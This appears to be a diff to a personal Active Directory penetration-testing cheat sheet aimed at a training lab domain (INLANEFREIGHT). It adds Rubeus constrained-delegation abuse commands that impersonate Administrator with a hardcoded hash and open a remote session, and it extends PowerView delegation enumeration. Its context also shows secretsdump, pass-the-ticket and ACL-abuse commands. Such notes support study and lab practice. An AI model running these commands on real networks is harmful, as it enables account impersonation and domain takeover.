@@ -658,12 +658,18 @@ impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY local
 
 #### Rubeus
 ```bash
+# Unconstrained Delegate
 # Ticket monitoring
 .\Rubeus.exe monitor /interval:5 /nowrap
 #PTT
 .\Rubeus.exe asktgs /ticket:BASE64 /service:cifs/dc01.INLANEFREIGHT.local /ptt 
 # TGT renew
 .\Rubeus.exe renew /ticket:BASE64 /ptt /nowrap
+
+# Constrained Delegate
+.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt
+## HTTP
+Enter-PSSession ws01.inlanefreight.local
 
 
 # AS-REP
@@ -793,7 +799,7 @@ Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol
 Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" 
 ## 制約ある
 Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof
-Get-DomainComputer -TrustedToAuth | select -Property dnshostname,useraccountcontrol
+Get-DomainComputer -TrustedToAuth | select -Property dnshostname,useraccountcontrol,msds-allowedtodelegateto
 
 # GenericAll to User
 $geneall = Get-ObjectAcl -Identity "UserName" | ?{$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value
